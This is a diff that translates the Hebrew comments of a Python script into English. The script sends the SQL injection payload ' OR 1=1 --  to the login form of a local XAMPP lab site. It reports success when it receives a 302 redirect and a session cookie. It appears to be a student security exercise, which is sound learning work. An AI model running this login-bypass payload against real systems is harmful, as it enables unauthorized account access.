@@ -1,30 +1,30 @@
 import requests
 
 #-------- can delete these ----------------------
-# כתובת האתר שלך (שנה לכתובת שבה האתר רץ אצלך ב-XAMPP)
+# Target URL (change to wherever the site is running on your XAMPP)
 target_url = "http://localhost/CyberProject/login.php"
 
-# ה-Payload שגילינו שעוקף את האימות
-# שמנו לב שצריך רווח אחרי המקפים ב-SQLite
+# The payload we discovered that bypasses authentication.
+# Note: SQLite requires a trailing space after the -- comment token.
 payload_username = "' OR 1=1 -- "
 payload_password = "anything_works"
 #-----------------------------------------------
 
 def sql_login_bypass(target_url="http://localhost/CyberProject/login.php", payload_username="' OR 1=1 -- ", payload_password="anything_works"):        
-    # הנתונים שנשלח בטופס (השמות username ו-password חייבים להתאים ל-name ב-HTML)
+    # Form data (the field names must match the name= attributes in the HTML).
     data = {
         "username": payload_username,
         "password": payload_password,
-        "login_submit": "" # שליחת הכפתור כדי שה-PHP יזהה את הבקשה
+        "login_submit": "" # Send the submit button so PHP recognises the request.
     }
 
     print(f"[*] Attempting SQL Injection on {target_url}...")
 
     try:
-        # שליחת הבקשה (אנחנו מבקשים לא לעקוב אחרי הפניות אוטומטית כדי שנראה את ה-302)
+        # Don't follow redirects automatically so we can see the 302.
         response = requests.post(target_url, data=data, allow_redirects=False)
 
-        # ב-PHP שלך, אם הלוגין מצליח, יש header("Location: home.php") - זה קוד 302
+        # On successful login, login.php sends header("Location: home.php") -> 302.
         if response.status_code == 302 and "home.php" in response.headers.get("Location", ""):
             session_id = response.cookies.get("PHPSESSID")
             print("[+] SUCCESS: SQL Injection Bypass Worked!")
